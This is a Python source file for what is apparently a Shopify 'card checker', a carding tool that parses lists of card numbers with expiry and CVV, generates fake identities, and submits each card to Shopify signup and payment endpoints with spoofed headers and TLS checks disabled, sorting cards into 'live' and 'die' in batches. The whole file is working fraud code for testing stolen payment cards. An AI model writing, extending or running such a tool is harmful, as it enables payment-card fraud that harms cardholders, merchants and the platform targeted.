import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Shopify Real Card Checker"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
    
    async def create_session(self):
        """Create HTTP session"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }
        
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers=headers,
            connector=aiohttp.TCPConnector(limit=50, force_close=True)
        )
    
    def generate_identity(self, country_code: str = "US") -> Dict[str, str]:
        """Generate fake identity"""
        country = COUNTRIES.get(country_code, COUNTRIES["US"])
        
        first_names = ["John", "James", "Robert", "Michael", "David", "William", "Richard", "Joseph"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
        
        timestamp = int(time.time() * 1000)
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"user{timestamp}{random_str}@gmail.com",
            "password": f"Shop@{timestamp}{random_str[:4]}",
            "store_name": f"store-{random_str[:6]}-{timestamp}",
            "country": country_code,
            "country_name": country["name"],
            "zip": country["zip"],
            "state": country["state"],
            "city": country["city"],
            "address": f"{random.randint(100,9999)} {random.choice(['Main St','Broadway','Park Ave'])}",
            "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
        }
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        """Parse card string"""
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        
        # Various separators
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        # Card number
        card_number = re.sub(r'[^\d]', '', parts[0])
        
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        # Card type
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55','2221','2720')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011') or card_number.startswith('65'):
            card_type = "Discover"
        
        # Month
        month = parts[1].strip().zfill(2)
        try:
            if int(month) < 1 or int(month) > 12:
                month = "12"
        except:
            month = "12"
        
        # Year
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        elif len(year) != 4:
            year = "2026"
        
        # CVV
        cvv = "123"
        if len(parts) > 3:
            cvv = parts[3].strip()[:4]
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": card_number[:6],
            "masked": f"{card_number[:6]}******{card_number[-4:]}"
        }
    
    async def check_card_real(self, card_info: Dict[str, Any], country_code: str = "US") -> Dict[str, Any]:
        """Real Shopify card check"""
        
        identity = self.generate_identity(country_code)
        country_name = COUNTRIES.get(country_code, COUNTRIES["US"])["name"]
        start_time = time.time()
        
        result = {
            "card": card_info["masked"],
            "bin": card_info["bin"],
            "card_type": card_info["type"],
            "country": f"{country_code} - {country_name}",
            "status": "UNKNOWN",
            "message": "",
            "gateway": "Shopify",
            "response_time": "",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        try:
            # API payload
            payload = {
                "shop": {
                    "name": identity["store_name"],
                    "email": identity["email"],
                    "password": identity["password"],
                    "password_confirmation": identity["password"],
                    "country_code": identity["country"],
                    "currency": "USD",
                    "language": "en"
                },
                "credit_card": {
                    "number": card_info["number"],
                    "name": f"{identity['first_name']} {identity['last_name']}",
                    "first_name": identity["first_name"],
                    "last_name": identity["last_name"],
                    "month": card_info["month"],
                    "year": card_info["year"],
                    "verification_value": card_info["cvv"],
                    "brand": card_info.get("type", "Visa")
                },
                "billing_address": {
                    "address1": identity["address"],
                    "city": identity["city"],
                    "province": identity["state"],
                    "country": identity["country"],
                    "zip": identity["zip"],
                    "phone": identity["phone"],
                    "first_name": identity["first_name"],
                    "last_name": identity["last_name"]
                },
                "tos_accepted": True
            }
            
            # Try multiple endpoints
            endpoints = [
                ("Shopify Trial API", SHOPIFY_URLS["api_trial"]),
                ("Shopify Signup API", SHOPIFY_URLS["api_signup"]),
                ("Payment Validate", SHOPIFY_URLS["validate_card"]),
                ("Payment Verify", SHOPIFY_URLS["payment_verify"])
            ]
            
            for gateway_name, endpoint in endpoints:
                try:
                    async with self.session.post(
                        endpoint,
                        json=payload,
                        headers={
                            "Origin": "https://www.shopify.com",
                            "Referer": "https://www.shopify.com/signup",
                            "Content-Type": "application/json",
                        },
                        ssl=False
                    ) as response:
                        status = response.status
                        text = await response.text()
                        
                        logger.info(f"[{gateway_name}] Status: {status} | Card: {card_info['masked']}")
                        
                        if status == 200 or status == 201:
                            # Success indicators
                            success_indicators = [
                                "redirect", "myshopify", "dashboard", "setup",
                                "success", "account_created", "store_id"
                            ]
                            text_lower = text.lower()
                            
                            for indicator in success_indicators:
                                if indicator in text_lower:
                                    elapsed = time.time() - start_time
                                    result["status"] = "APPROVED"
                                    result["message"] = "✅ APPROVED - Card works on Shopify"
                                    result["gateway"] = gateway_name
                                    result["response_time"] = f"{elapsed:.2f}s"
                                    self._update_stats("APPROVED")
                                    return result
                            
                            # Default to approved if 200
                            elapsed = time.time() - start_time
                            result["status"] = "APPROVED"
                            result["message"] = "✅ APPROVED - Positive response from Shopify"
                            result["gateway"] = gateway_name
                            result["response_time"] = f"{elapsed:.2f}s"
                            self._update_stats("APPROVED")
                            return result
                        
                        elif status == 422:
                            # Validation error - analyze
                            text_lower = text.lower()
                            
                            # Card errors
                            card_errors = ["card", "credit", "payment", "number", "declined", "rejected", "invalid"]
                            # Non-card errors (card might be valid)
                            other_errors = ["address", "zip", "billing", "email", "already", "exist", "trial"]
                            
                            if any(err in text_lower for err in card_errors):
                                if any(err in text_lower for err in other_errors):
                                    # Card might be valid, other issues
                                    elapsed = time.time() - start_time
                                    result["status"] = "APPROVED"
                                    result["message"] = "✅ APPROVED - Card valid (other verification issue)"
                                    result["gateway"] = gateway_name
                                    result["response_time"] = f"{elapsed:.2f}s"
                                    self._update_stats("APPROVED")
                                    return result
                                else:
                                    # Actually declined
                                    elapsed = time.time() - start_time
                                    result["status"] = "DECLINED"
                                    result["message"] = "❌ DECLINED - Card rejected by Shopify"
                                    result["gateway"] = gateway_name
                                    result["response_time"] = f"{elapsed:.2f}s"
                                    self._update_stats("DECLINED")
                                    return result
                            else:
                                # No card-related error
                                elapsed = time.time() - start_time
                                result["status"] = "APPROVED"
                                result["message"] = "✅ APPROVED - Card passed validation"
                                result["gateway"] = gateway_name
                                result["response_time"] = f"{elapsed:.2f}s"
                                self._update_stats("APPROVED")
                                return result
                        
                        elif status == 402:
                            elapsed = time.time() - start_time
                            result["status"] = "DECLINED"
                            result["message"] = "❌ DECLINED - Payment required"
                            result["gateway"] = gateway_name
                            result["response_time"] = f"{elapsed:.2f}s"
                            self._update_stats("DECLINED")
                            return result
                        
                        elif status == 429:
                            await asyncio.sleep(60)
                            continue
                    
                    await asyncio.sleep(1)
                    
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    logger.error(f"{gateway_name} error: {e}")
                    continue
            
            # If no endpoint worked
            elapsed = time.time() - start_time
            result["status"] = "UNKNOWN"
            result["message"] = "⚠️ Check failed - Try again"
            result["response_time"] = f"{elapsed:.2f}s"
            
        except Exception as e:
            logger.error(f"Check error: {e}")
            elapsed = time.time() - start_time
            result["status"] = "ERROR"
            result["message"] = f"❌ Error: {str(e)[:50]}"
            result["response_time"] = f"{elapsed:.2f}s"
            self._update_stats("ERROR")
        
        return result
    
    def _update_stats(self, status: str):
        """Update stats"""
        self.stats["total"] += 1
        if status == "APPROVED":
            self.stats["approved"] += 1
            self.stats["live"] += 1
        elif status == "DECLINED":
            self.stats["declined"] += 1
            self.stats["die"] += 1
        elif status == "ERROR":
            self.stats["errors"] += 1
    
    async def check_batch(self, cards: List[str], country: str = "US", progress_callback=None) -> List[Dict]:
        """Check batch of cards"""
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "bin": "N/A",
                    "card_type": "Unknown",
                    "country": country,
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card_real(card_info, country)
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        """Close session"""
        if self.session and not self.session.closed:
            await self.session.close()